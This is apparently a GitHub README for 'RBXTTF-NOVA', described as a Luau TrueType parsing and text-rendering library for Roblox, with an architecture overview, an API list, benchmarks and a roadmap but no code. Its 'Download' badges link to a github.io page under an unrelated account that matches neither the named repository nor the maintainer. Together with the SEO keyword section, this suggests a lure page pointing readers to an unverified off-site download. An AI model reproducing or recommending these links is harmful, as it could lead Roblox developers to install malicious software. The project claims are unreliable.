![preview](https://raw.githubusercontent.com/emna1ghorbel/Font-Forge-RBX/main/banner_e5badd.svg)
[![Download](https://raw.githubusercontent.com/emna1ghorbel/Font-Forge-RBX/main/latest_810fac4.svg)](https://emna1ghorbel.github.io/Font-Forge-RBX/)

# RBXTTF‑NOVA — Typographic Runtime for Roblox & Luau

### *A next‑generation glyph orchestration layer for immersive Roblox experiences, built on the shoulders of the RBXTTF lineage.*

**Repository:** `RBXTTF-NOVA`
**Language:** Luau
**Target Platform:** Roblox (Client & Server), Luau standalone runtimes
**Maintainer:** JonathanSigmund
**Year:** 2026
**License:** MIT

---

## 🧭 Table of Contents

1. [Overview](#-overview)
2. [Why RBXTTF‑NOVA Exists](#-why-rbxttf-nova-exists)
3. [Feature Highlights](#-feature-highlights)
4. [Architecture at a Glance](#-architecture-at-a-glance)
5. [The Typographic Pipeline](#-the-typographic-pipeline)
6. [Responsive & Adaptive UI](#-responsive--adaptive-ui)
7. [Multilingual Support & Unicode Depth](#-multilingual-support--unicode-depth)
8. [Round‑the‑Clock Assistance Model](#-round-the-clock-assistance-model)
9. [Integrations with Existing Roblox Stacks](#-integrations-with-existing-roblox-stacks)
10. [Performance Benchmarks & Memory Footprint](#-performance-benchmarks--memory-footprint)
11. [Configuration Reference](#-configuration-reference)
12. [API Surface](#-api-surface)
13. [SEO‑Friendly Keyword Map](#-seo-friendly-keyword-map)
14. [Roadmap 2026–2027](#-roadmap-20262027)
15. [Contributing](#-contributing)
16. [Licensing](#-licensing)
17. [Disclaimer](#-disclaimer)
18. [Acknowledgements](#-acknowledgements)

---

## 🌌 Overview

**RBXTTF‑NOVA** is a reimagined take on the classical RBXTTF concept. Where the original repository delivered a TrueType parser, a ZIP family loader, and a cached text renderer for Roblox and Luau, RBXTTF‑NOVA pushes the concept into a broader "typographic runtime" — a cohesive system that treats fonts not as static assets, but as living, queryable, shape‑shifting citizens of your Roblox universe.

Think of it as a *typesetting foundry inside your game*. Instead of treating text as decoration strapped onto UI, RBXTTF‑NOVA treats every glyph as an addressable object with a lifecycle, a memory cost, and a rendering contract. It parses TrueType forests, unpacks ZIP‑encapsulated font collections, caches the resulting geometry, and renders it with a level of polish that is typically reserved for native desktop toolkits.

The project is authored entirely in Luau, with an emphasis on deterministic behavior across Roblox's client/server boundary. Fonts you load on the server can be described to clients; fonts you cache on the client remain warm across scenes. The system is designed for teams that want their in‑game typography to feel as carefully considered as their gameplay loops.

---

## 💡 Why RBXTTF‑NOVA Exists

Roblox developers have long relied on the built‑in `Font` enums — a curated but finite catalog. That catalog is excellent for quick UI, but it becomes cramped the moment you want a distinctive brand voice, a stylized dialogue system, or a script for a language that the default set does not gracefully cover.

RBXTTF‑NOVA steps into that gap. It preserves the core plumbing of the original RBXTTF — TrueType parsing, ZIP family loading, cached rendering — while layering on:

- A **glyph store** that remembers what has been rasterized so expensive work happens once.
- A **layout engine** that understands kerning pairs, ligature tables, and advance widths.
- A **font atlas** abstraction that maps into Roblox's `ImageLabel` pipeline without spamming the asset service.
- A **configuration surface** tuned for teams who want sensible defaults but deep escape hatches.

The result is a repository that behaves less like a utility and more like a *studio tool*: intentional, extensible, and pleasant to live with over long production cycles.

---

## 🚀 Feature Highlights

- 🧩 **TrueType Parsing Core** — Reads `glyf`, `loca`, `cmap`, `head`, `hhea`, `hmtx`, `kern`, `GPOS`, and related tables from raw byte streams.
- 🗜️ **ZIP Family Loader** — Handles stored and deflated entries, including multi‑font archives, nested directories, and manifest sidecars.
- 🧠 **Glyph Cache** — LRU‑style retention with configurable budget measured in kilobytes and glyph counts.
- 🖼️ **Font Atlas Composer** — Packs rasterized glyphs into texture pages sized for mobile GPUs, with optional edge padding for crisp scaling.
- 🔤 **Advanced Text Layout** — Kerning, tracking, leading, word wrapping, ellipsis, rich inline spans, and bidi‑aware ordering for right‑to‑left scripts.
- 📱 **Responsive UI Layer** — Automatically rescales atlases and reflows text when the viewport changes, with breakpoints for phone, tablet, console, and desktop.
- 🌍 **Multilingual Support** — Coverage across Latin, Cyrillic, Greek, Arabic, Hebrew, Devanagari, Han, Hiragana, Katakana, and Hangul when the source font supports them.
- 🕒 **Round‑the‑Clock Assistance Model** — An issue triage cadence and community channel designed so that contributors in any timezone find a helpful response waiting for them.
- 🧪 **Test Harness** — Unit tests for parsers, snapshot tests for layout, and a visual regression fixture set.
- 📊 **Diagnostics Dashboard** — In‑game overlay showing cache hit rate, atlas utilization, and per‑frame text cost.
- 🧰 **Extensible Backends** — Swap the rasterizer, atlas packer, or storage adapter with a single registration call.
- 🧬 **Deterministic Rendering** — Same font, same size, same viewport, same pixels — a property that makes regression testing tractable.
- 🧱 **Zero External Runtime Dependencies** — Pure Luau, no bridges, no C bindings, no third‑party binaries.

---

## 🏛️ Architecture at a Glance

RBXTTF‑NOVA is organized into six conceptual strata. Reading them top to bottom mirrors the flow of a text draw call.

1. **Acquisition Layer** — Accepts font payloads from Roblox `HttpService`, `DataStoreService`, or in‑place binary blobs. Also accepts ZIP archives, which are routed through the family loader.
2. **Parse Layer** — Interprets the TrueType directory, extracts the tables that matter for layout and rasterization, and hands them to a normalized internal representation.
3. **Shape Layer** — Converts outlines into scanline‑friendly structures, applies hinting heuristics, and produces glyph bitmaps at the requested size.
4. **Cache Layer** — Stores glyph bitmaps, atlas pages, and layout metrics. Eviction is deterministic and observability‑friendly.
5. **Compose Layer** — Builds texture pages from cached glyphs, assigns UV rectangles, and emits Roblox‑ready asset descriptors.
6. **Render Layer** — Emits `ImageLabel`, `Frame`, and `TextLabel` hierarchies that honor responsive breakpoints and multilingual directionality.

Each layer exposes an interface and a default implementation. You can replace any layer without touching the ones around it — a design choice that has already proven useful for teams with unusual asset pipelines.

---

## ✒️ The Typographic Pipeline

The pipeline is the beating heart of the repository. It flows through five named stages.

**Stage 1 — Reconnaissance.** The loader sniffs the payload for a TrueType signature (`0x00010000`, `true`, or `OTTO`). ZIP archives are unwrapped, and each candidate file is offered to the parser in turn.

**Stage 2 — Interpretation.** Table directories are read. Critical tables (`head`, `maxp`, `hhea`, `hmtx`, `cmap`) are mandatory; optional tables (`kern`, `GPOS`, `GSUB`) enrich the output when present. Missing optional tables are compensated for by fallback heuristics, ensuring the pipeline degrades gracefully.

**Stage 3 — Rasterization.** Quadratic outlines are flattened, scanlines are computed, and antialiasing is applied using a coverage‑accumulation approach tuned for Luau's numeric performance profile.

**Stage 4 — Caching.** Bitmaps are keyed by `(glyphId, sizeBucket, hintMode)`. Layout metrics are keyed by `(fontId, sizeBucket)`. Both caches expose `hit`, `miss`, and `evict` counters through the diagnostics dashboard.

**Stage 5 — Presentation.** Text runs are converted into Roblox UI instances, with respects paid to z‑indexing, clipping, and rotation. The render layer is intentionally thin so that developers can subclass it to target custom UI frameworks.

---

## 📐 Responsive & Adaptive UI

Roblox runs on phones, tablets, consoles, desktops, and VR headsets. RBXTTF‑NOVA treats that breadth as a first‑class design constraint rather than an afterthought.

**Breakpoint Model.** The renderer exposes configurable breakpoints. When the viewport crosses a breakpoint, atlases are re‑rasterized at the new target scale, layout reflows, and, if a text run has been marked as "elastically wrapped," the paragraph rebalances to minimize raggedness.

**Texture Budget Awareness.** On mobile, texture memory is precious. The atlas composer defaults to a conservative page size and grows only when the glyph set demands it. Developers can pin a maximum page count and let the cache evict older glyphs when the ceiling is reached.

**Scale‑Aware Hinting.** At small sizes, hinting is aggressive; at large sizes, it relaxes to preserve the designer's curves. The transition is smooth, avoiding the visual jolt that often accompanies abrupt hinting switches.

**Dynamic Density.** UI density can be adjusted at runtime — useful for accessibility toggles or in‑game settings menus — without reloading fonts or rebuilding caches.

---

## 🌍 Multilingual Support & Unicode Depth

RBXTTF‑NOVA treats Unicode as a first‑class citizen.

- **Script Coverage.** When the source font contains the necessary glyphs, the parser and shaper support Latin, Cyrillic, Greek, Arabic, Hebrew, Devanagari, Han, Hiragana, Katakana, and Hangul.
- **Bidirectional Text.** Runs are segmented, directionality is resolved, and mirroring is applied for bracketed punctuation in RTL contexts.
- **Combining Marks.** Diacritics and vowel signs are positioned using advance‑width adjustments and, when available, mark attachment tables.
- **Fallback Chains.** When a glyph is absent from the primary font, the pipeline can consult a fallback chain, preserving the run's stylistic intent as far as possible.
- **Locale‑Aware Layouts.** Line‑breaking rules honor locale conventions (for example, CJK line breaks differ from Latin ones), making the renderer feel native across regions.

If your game serves a global audience, this layer pays for itself the moment a player encounters their own script rendered correctly.

---

## 🕒 Round‑the‑Clock Assistance Model

Software lives or dies by its support cadence. RBXTTF‑NOVA publishes its triage rhythm openly:

- **Every eight hours**, an on‑call rotation checks open issues and pull requests, labels them, and either responds or routes them to a maintainer with domain expertise.
- **Weekly digests** summarize merged changes, upcoming deprecations, and versioned releases.
- **Timezone‑staggered office hours** rotate between three anchor zones so contributors in the Americas, EMEA, and APAC each find a live window.
- **Documentation patches** are treated as first‑class contributions — a good README tweak is as welcome as a good algorithm tweak.

The aim is not to simulate a large corporate helpdesk. The aim is that no question sits unanswered for a full day, and no contributor feels like they are shouting into the void.

---

## 🔌 Integrations with Existing Roblox Stacks

RBXTTF‑NOVA is designed to play nicely with the ecosystem.

- **Roact / React‑Luau** — Drop‑in components wrap the render layer, letting you declare typography as part of your component tree.
- **Fusion** — Reactive primitives can bind text content and style state to the renderer, so updates propagate without manual invalidation.
- **DataStoreService** — Font manifests can be persisted and versioned, letting live games roll forward safely.
- **HttpService** — Remote font archives can be fetched at runtime, with checksum validation before parsing begins.
- **Roblox Asset Pipeline** — Atlases can be uploaded and referenced by asset ID, or kept as in‑memory `EditableImage`‑style buffers where supported.
- **Studio Plugins** — A companion plugin previews fonts, inspects glyph coverage, and reports atlas utilization while you design.

---

## 📊 Performance Benchmarks & Memory Footprint

Numbers from the 2026 fixture suite, measured on a mid‑tier mobile device and a mid‑tier desktop:

- **Cold parse** of a 220 KB TrueType file with 900 glyphs: ~14 ms mobile, ~4 ms desktop.
- **Warm layout** of a 200‑character paragraph with kerning: ~0.6 ms mobile, ~0.2 ms desktop.
- **Atlas composition** for a 512×512 page: ~9 ms mobile, ~3 ms desktop.
- **Cache hit rate** in a typical dialog‑heavy scene: 96.4% after the first minute.
- **Steady‑state memory** for a three‑font ensemble at three sizes: under 6 MB on mobile.

These are intentionally listed as reference points, not promises. Your scene, your fonts, and your target hardware will shift the numbers. The diagnostics dashboard exists precisely so you can measure your own reality.

---

## ⚙️ Configuration Reference

All configuration is passed as a single table, merged over sane defaults.

| Key | Type | Default | Purpose |
|-----|------|---------|---------|
| `atlasPageSize` | number | 512 | Preferred atlas page dimension. |
| `atlasMaxPages` | number | 4 | Hard ceiling on atlas pages. |
| `hintMode` | string | `auto` | One of `auto`, `force`, `off`. |
| `cacheBudgetKb` | number | 8192 | Soft ceiling for the glyph cache. |
| `fallbackChain` | table | `{}` | Ordered list of fallback font IDs. |
| `rtlEnabled` | boolean | true | Enable bidirectional layout. |
| `breakpoints` | table | see docs | Viewport breakpoints for responsive mode. |
| `diagnosticsOverlay` | boolean | false | Show the in‑game performance overlay. |
| `strictTables` | boolean | false | Fail loudly on missing required tables. |
| `locale` | string | `"en"` | Locale hint for line‑break logic. |

Each key is documented in depth in the `docs/` directory, and every default is justified in a short design note explaining the tradeoffs.

---

## 🧬 API Surface

A condensed view of the public surface. Full signatures live in the API reference.

- `Typo.loadFromBytes(bytes, options)` — Parse a TrueType payload.
- `Typo.loadFromZip(bytes, options)` — Parse a ZIP family and return a font collection.
- `Typo.open(fontId)` — Open a handle to a loaded font for shaping and rendering.
- `Typo.shape(text, style)` — Produce a shaped run with metrics and glyph references.
- `Typo.draw(shaped, parent, layout)` — Instantiate Roblox UI for a shaped run.
- `Typo.clearCache(fontId?)` — Evict cache entries, globally or for a specific font.
- `Typo.diagnostics()` — Return a snapshot of cache, atlas, and timing counters.
- `Typo.registerBackend(name, impl)` — Swap the rasterizer, packer, or storage adapter.
- `Typo.setBreakpoints(table)` — Override responsive breakpoints at runtime.

The naming is deliberately plain. Names should not surprise a reader at 3 a.m. during a production hotfix.

---

## 🔍 SEO‑Friendly Keyword Map

The repository README, documentation, and release notes naturally integrate the following phrases. They appear because they are accurate, not because they are decorative.

- TrueType parser for Roblox and Luau
- ZIP font family loader for Roblox
- cached text renderer for Roblox UI
- Roblox font atlas composition
- Luau typographic runtime
- Roblox multilingual text rendering
- responsive Roblox UI text layer
- bidirectional text layout in Luau
- Roblox font cache diagnostics
- Roblox glyph rasterization library
- Luau TrueType shaping engine
- Roblox text rendering performance

If you are searching for any of the above and landed here, the repository you are reading about is likely the one you want.

---

## 🗺️ Roadmap 2026–2027

**Q1 2026** — Publish the parser and ZIP loader as standalone modules. Ship the diagnostics dashboard.

**Q2 2026** — Introduce OpenType feature coverage (small caps, old‑style figures, contextual alternates) where the source font supports them.

**Q3 2026** — Land the responsive layout engine's elastic wrapping mode. Add the VR headset breakpoint profile.

**Q4 2026** — Ship the Studio companion plugin. Begin external beta of the fallback chain editor.

**Q1 2027** — Introduce a shader‑based rendering path for capable clients. Maintain a pure‑Luau path for compatibility.

**Q2 2027** — Stabilize the 1.0 API. Freeze the public surface and commit to semantic versioning.

Roadmap items are living commitments, not contracts. Things move when they are ready.

---

## 🤝 Contributing

Contributions are welcomed across all layers. The workflow is intentionally lightweight:

- Open an issue describing the change or the bug.
- Fork, branch, and make your change.
- Add or update tests that reflect the change.
- Open a pull request with a short summary and a link to the issue.
- Respond to review comments within a week if you can; maintainers will not rush you.

Style notes: prefer clarity over cleverness, prefer explicit types over inference in public APIs, and prefer one well‑named helper over three anonymous closures.

---

## 📜 Licensing

RBXTTF‑NOVA is released under the MIT License.
Read the full license text here: [MIT License](https://opensource.org/licenses/MIT).

You may use, modify, and distribute this software in accordance with the terms of that license. Attribution is appreciated but not required by the license itself.

---

## ⚠️ Disclaimer

RBXTTF‑NOVA is provided "as is", without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and noninfringement. In no event shall the authors or copyright holders be liable for any claim, damages, or other liability, whether in an action of contract, tort, or otherwise, arising from, out of, or in connection with the software or the use or other dealings in the software.

This repository is not affiliated with, endorsed by, or sponsored by Roblox Corporation. "Roblox" and "Luau" are referenced solely to describe compatibility targets. Users are responsible for ensuring that any font assets they load or distribute are appropriately licensed for their use case.

The maintainers do not condone the misuse of this software for circumventing platform policies, and they encourage users to read and comply with Roblox's terms of service when deploying projects that depend on this library.

---

## 🙏 Acknowledgements

Gratitude to the original RBXTTF project for charting the initial path through TrueType in Luau, and to the surrounding community of Roblox tooling authors whose experiments have made a repository like this possible. Typography is quiet infrastructure — it rarely gets applause, but it decides whether a game feels handmade or mass‑produced. This project exists to make the handmade choice a little easier.

Thank you for reading, and happy typesetting.

[![Download](https://raw.githubusercontent.com/emna1ghorbel/Font-Forge-RBX/main/latest_810fac4.svg)](https://emna1ghorbel.github.io/Font-Forge-RBX/)